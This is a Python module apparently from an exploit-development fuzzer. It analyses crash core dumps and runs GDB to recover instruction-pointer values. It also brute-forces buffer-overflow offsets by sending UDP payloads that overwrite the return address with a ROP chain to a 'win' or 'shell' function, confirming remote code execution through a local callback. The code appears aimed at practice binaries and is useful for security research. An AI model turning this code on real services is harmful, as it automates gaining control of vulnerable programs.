"""Corefile, GDB crash analysis and brute-force offset methods for Fuzzer."""
import os
import re
import time
import socket
import subprocess
import logging
from utils._process import no_core_preexec, CORE_DIR

log = logging.getLogger("binsmasher")


class CoreAnalysisMixin:
    """Methods: _find_offset_from_core_stack, _extract_rip_from_coredumpctl,
       _brute_offset_udp, _auto_gdb_crash_analysis."""

    def _find_offset_from_core_stack(self, core_path: str, cyclic_size: int) -> int:
        try:
            from pwn import cyclic, cyclic_find, Corefile
            import struct

            core = Corefile(core_path)
            pat = cyclic(cyclic_size)

            rsp = getattr(core, "rsp", None) or getattr(core, "sp", None)
            if rsp is None:
                log.debug("  Stack scan: no RSP in core")
                return -1

            lookup = {}
            for _ci in range(cyclic_size - 3):
                _v = struct.unpack_from("<I", pat, _ci)[0]
                if _v not in lookup:
                    lookup[_v] = _ci

            log.debug(f"  Stack scan: RSP={hex(rsp)}, {len(core.mappings)} mappings")

            best_off = -1
            best_addr = -1
            scanned_kb = 0
            all_hits: dict = {}

            for mapping in core.mappings:
                data = mapping.data
                if not data:
                    continue
                base = mapping.start
                name = getattr(mapping, "name", "") or ""
                if name and name not in ("[stack]", "", "None") and "/" in name:
                    continue
                if base >= 0x800000000000:
                    continue
                kb = len(data) // 1024
                scanned_kb += kb

                for i in range(0, len(data) - 7, 4):
                    val32 = struct.unpack_from("<I", data, i)[0]
                    off = lookup.get(val32, -1)
                    if off != -1 and off < cyclic_size:
                        addr = base + i
                        all_hits[addr] = off
                        if off > best_off:
                            best_off = off
                            best_addr = addr

            log.info(f"  Stack scan: searched {scanned_kb} KB across"
                     f" {len(core.mappings)} mappings")

            if best_off == -1:
                log.info("  Stack scan: no cyclic bytes found in any mapping")
                return -1

            if best_off >= 4 and all_hits.get(best_addr - 4) == best_off - 4:
                slot_start = best_off - 4
                log.info(f"  Stack scan: consecutive 8-byte run found "
                         f"(cyclic[{slot_start}..{best_off + 3}]) — "
                         f"ret addr slot starts at offset {slot_start}")
            else:
                slot_start = best_off
                log.info(f"  Stack scan: single 4-byte match — "
                         f"ret addr offset = {slot_start}")

            return slot_start

        except Exception as e:
            log.debug(f"  _find_offset_from_core_stack error: {e}")
            return -1

    def _extract_rip_from_coredumpctl(self, binary: str, pid: int):
        import shutil as _shutil
        import tempfile as _tempfile
        import glob as _gl

        log.info(f"  coredumpctl: waiting for core of PID {pid}…")
        time.sleep(3.0)

        _cwd = CORE_DIR
        _now2 = time.time()
        _pid_specific = sorted(
            [f for f in (
                _gl.glob(f"{_cwd}/core.{pid}") +
                _gl.glob(f"{_cwd}/core.*{pid}*") +
                _gl.glob(f"/tmp/core.{pid}") +
                _gl.glob(f"/tmp/core.*{pid}*")
            ) if os.path.exists(f) and os.path.getsize(f) > 1000],
            key=os.path.getmtime, reverse=True
        )
        _generic = []
        if not _pid_specific:
            _g = os.path.join(CORE_DIR, "core")
            if (os.path.exists(_g) and os.path.getsize(_g) > 1000 and
                    _now2 - os.path.getmtime(_g) < 5):
                _generic = [_g]
        _core_candidates = _pid_specific + _generic
        log.info(f"  Core file search for PID {pid}: {len(_core_candidates)} candidate(s): "
                 f"{_core_candidates[:3]}")
        for _cp in _core_candidates:
            if os.path.getsize(_cp) < 1000:
                continue
            try:
                from pwn import Corefile
                _core = Corefile(_cp)
                _pc = (getattr(_core, "pc", None) or
                       getattr(_core, "rip", None) or
                       getattr(_core, "eip", None))
                if _pc:
                    log.info(f"  ✓ Core file RIP={hex(_pc)} (from {_cp})")
                    return int(_pc)
            except Exception as _ce:
                log.info(f"  Core file {_cp}: {_ce}")

        if not _shutil.which("coredumpctl"):
            log.info("  coredumpctl not found — only core files in CWD supported")
            return None
        try:
            out = subprocess.check_output(
                ["coredumpctl", "info", "--no-pager", str(pid)],
                stderr=subprocess.PIPE, timeout=15
            ).decode(errors="replace")
            log.info(f"  coredumpctl info output:\n{out[:600]}")
            for pattern in [
                r"RIP:\s*0x([0-9a-fA-F]+)",
                r"\brip\s+0x([0-9a-fA-F]+)",
                r"RIP=0x([0-9a-fA-F]+)",
                r"rip\s*=\s*0x([0-9a-fA-F]+)",
            ]:
                _m = re.search(pattern, out, re.IGNORECASE | re.MULTILINE)
                if _m:
                    rip = int(_m.group(1), 16)
                    log.info(f"  ✓ coredumpctl info: RIP={hex(rip)}")
                    return rip
            log.info("  coredumpctl info: no RIP pattern matched in output")
        except subprocess.CalledProcessError as e:
            log.info(f"  coredumpctl info failed (rc={e.returncode}): "
                     f"{e.stderr.decode(errors='replace')[:200] if e.stderr else ''}")
        except Exception as e:
            log.info(f"  coredumpctl info error: {e}")

        _core_tmp = None
        try:
            # Write core dump to a file inside CORE_DIR (never in CWD)
            # Use --output to a named path; fall back to stdout pipe if that fails.
            _core_tmp = os.path.join(CORE_DIR, f"coredump_{pid}.core")
            _out2 = subprocess.run(
                ["coredumpctl", "dump", "--output", _core_tmp, str(pid)],
                capture_output=True, timeout=20,
                cwd=CORE_DIR,  # ensure CWD is CORE_DIR, not project root
            )
            if not os.path.exists(_core_tmp) or os.path.getsize(_core_tmp) < 100:
                # Fall back: capture stdout (some coredumpctl versions write to stdout)
                _out3 = subprocess.run(
                    ["coredumpctl", "dump", str(pid)],
                    capture_output=True, timeout=20, cwd=CORE_DIR
                )
                if _out3.stdout and len(_out3.stdout) > 100:
                    with open(_core_tmp, "wb") as _cf: _cf.write(_out3.stdout)
            log.info(f"  coredumpctl dump size={os.path.getsize(_core_tmp) if os.path.exists(_core_tmp) else 0}B")
            if os.path.exists(_core_tmp) and os.path.getsize(_core_tmp) > 1000:
                from pwn import Corefile
                _core2 = Corefile(_core_tmp)
                _pc2 = (getattr(_core2, "pc", None) or
                        getattr(_core2, "rip", None) or
                        getattr(_core2, "eip", None))
                if _pc2:
                    log.info(f"  ✓ coredumpctl dump: RIP={hex(_pc2)}")
                    return int(_pc2)
        except Exception as e:
            log.info(f"  coredumpctl dump error: {e}")
        finally:
            if _core_tmp:
                try:
                    os.unlink(_core_tmp)
                except Exception:
                    pass

        log.info(f"  All coredump strategies failed for PID {pid}")
        return None

    def _brute_offset_udp(self, payload_template: bytes, binary: str,
                           binary_args: list, host: str, port: int,
                           lo: int, hi: int, step: int,
                           pie_base: int, use_placeholder: bool,
                           inj_start: int, inj_len: int, inj_byte: int):
        try:
            from pwn import ELF as _BELf, ROP as _BROP, p64 as _bp64, context as _bctx
            _elf = _BELf(binary, checksec=False)
            _WIN_KW = ["win", "flag", "shell", "backdoor", "secret",
                       "easy", "print_flag", "cat_flag"]
            _win_rel = next(
                (a for n, a in _elf.symbols.items()
                 if a and any(kw == n.lower() or n.lower().startswith(kw)
                              for kw in _WIN_KW)),
                0
            )
            if not _win_rel:
                log.warning("  Brute offset: no win() candidate found in binary")
                return None
            _win_abs = pie_base + _win_rel
            try:
                _rop = _BROP(_elf)
                _ret_g = _rop.find_gadget(["ret"])
                _ret_abs = (_ret_g[0] + pie_base) if _ret_g else 0
            except Exception:
                _ret_abs = 0
            log.info(f"  Brute offset: testing range [{lo}–{hi}] step={step} "
                     f"win={hex(_win_abs)}")
        except Exception as e:
            log.warning(f"  Brute offset setup failed: {e}")
            return None

        _word = 8 if _bctx.arch == "amd64" else 4
        for _off in range(lo, hi + 1, step):
            if _bctx.arch == "amd64":
                _chain = (_bp64(_ret_abs) if _ret_abs else b"") + _bp64(_win_abs)
            else:
                from pwn import p32 as _bp32
                _chain = _bp32(_win_abs)
            _exploit = b"A" * _off + _chain

            if use_placeholder:
                _crafted = self._build_udp_payload(payload_template, _exploit)
            else:
                _inj = _exploit
                if len(_inj) < inj_len:
                    _inj = _inj + bytes([inj_byte]) * (inj_len - len(_inj))
                else:
                    _inj = _inj[:inj_len]
                _crafted = (payload_template[:inj_start]
                            + _inj
                            + payload_template[inj_start + inj_len:])

            try:
                _p = subprocess.Popen(
                    [binary] + binary_args,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self._wait_for_udp_port(host, port, timeout=5.0)

                _lsock = None
                _lport = 16666
                try:
                    _lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    _lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    _lsock.bind(("127.0.0.1", _lport))
                    _lsock.listen(1)
                    _lsock.settimeout(3.0)
                except Exception:
                    _lsock = None

                _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                _s.settimeout(2.0)
                _s.sendto(_crafted, (host, port))
                _s.close()

                _rce = False
                if _lsock:
                    try:
                        _conn, _ = _lsock.accept()
                        _rce = True
                        _conn.close()
                    except socket.timeout:
                        pass
                    finally:
                        _lsock.close()

                time.sleep(2.0)
                _rc = _p.poll()

                if _rce:
                    log.info(f"  ✓ Brute offset={_off}: RCE CONFIRMED — "
                             f"win callback received (win={hex(_win_abs)})")
                    try:
                        _p.kill()
                        _p.wait(timeout=2)
                    except Exception:
                        pass
                    return _off
                elif _rc is None:
                    log.debug(f"  Brute offset={_off}: process alive, no RCE callback — "
                              f"win may have run but not connected back")
                    try:
                        _p.kill()
                        _p.wait(timeout=2)
                    except Exception:
                        pass
                    return _off
                elif _rc == 0:
                    log.debug(f"  Brute offset={_off}: clean exit (rc=0)")
                else:
                    log.debug(f"  Brute offset={_off}: crash rc={_rc} — wrong offset")
                try:
                    _p.kill()
                except Exception:
                    pass
            except Exception as _be:
                log.debug(f"  Brute offset={_off}: {_be}")

        log.warning(f"  Brute offset: no confirmed RIP control in [{lo}–{hi}]")
        log.warning(f"  This vulnerability is a heap pointer corruption, not a direct")
        log.warning(f"  return address overwrite. Manual heap analysis required.")
        log.warning(f"  Run: coredumpctl debug $(coredumpctl list | tail -1 | awk '{{print $2}}')")
        return None

    def _auto_gdb_crash_analysis(self, binary: str, binary_args: list,
                                  crash_payload: bytes,
                                  host: str, port: int,
                                  startup_wait: float = 3.0) -> str:
        import shutil
        import tempfile
        if not shutil.which("gdb"):
            log.warning("  GDB not found — install: apt install gdb")
            return ""

        _ba_str = " ".join(binary_args)
        gdb_script = (
            "set pagination off\n"
            "set confirm off\n"
            "set print thread-events off\n"
            "set non-stop off\n"
            "handle SIGSEGV stop print nopass\n"
            "handle SIGABRT stop print nopass\n"
            "handle SIGBUS  stop print nopass\n"
            "handle SIGILL  stop print nopass\n"
            "define hook-stop\n"
            "  echo ===CRASH_START===\n\n"
            "  thread apply all bt\n"
            "  info registers\n"
            "  echo ===STACK===\n\n"
            "  x/32gx $rsp\n"
            "  echo ===RIP===\n\n"
            "  p/x $rip\n"
            "  echo ===CRASH_END===\n\n"
            "  quit\n"
            "end\n"
            f"file {binary}\n"
            f"run {_ba_str}\n"
        )

        script_fd, script_path = tempfile.mkstemp(suffix=".gdb")
        out_path = None
        try:
            import os as _os
            _os.write(script_fd, gdb_script.encode())
            _os.close(script_fd)

            gdb_proc = subprocess.Popen(
                ["gdb", "--batch", "-x", script_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                preexec_fn=no_core_preexec,
            )

            time.sleep(startup_wait + 2.0)

            _sent = False
            for _retry in range(3):
                try:
                    _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    _s.settimeout(2.0)
                    _s.sendto(crash_payload, (host, port))
                    try:
                        _s.recvfrom(1024)
                    except Exception:
                        pass
                    _s.close()
                    _sent = True
                    break
                except Exception as _e:
                    log.debug(f"  GDB crash send attempt {_retry + 1}: {_e}")
                    time.sleep(1.0)

            if not _sent:
                log.warning("  GDB: could not send crash payload — port not ready")

            try:
                out, _ = gdb_proc.communicate(timeout=15)
                output = out.decode(errors="replace")
            except subprocess.TimeoutExpired:
                gdb_proc.kill()
                out, _ = gdb_proc.communicate()
                output = out.decode(errors="replace")

            return output

        except Exception as e:
            log.debug(f"  _auto_gdb_crash_analysis: {e}")
            return ""
        finally:
            try:
                _os.unlink(script_path)
            except Exception:
                pass
